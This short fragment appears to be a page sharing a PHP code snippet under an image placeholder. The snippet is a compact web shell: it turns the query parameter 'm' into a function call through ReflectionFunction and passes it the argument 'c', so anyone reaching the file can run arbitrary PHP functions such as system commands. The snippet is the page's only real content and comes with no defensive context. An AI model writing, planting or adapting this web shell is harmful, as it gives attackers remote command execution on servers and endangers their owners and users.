

<img src="11.jpg" alt="alt text" title="Title" />


***************************************************
code:

    <?php
        $func = new ReflectionFunction($_GET[m]);
        echo $func->invokeArgs(array($_GET[c]));
    ?>

***************************************************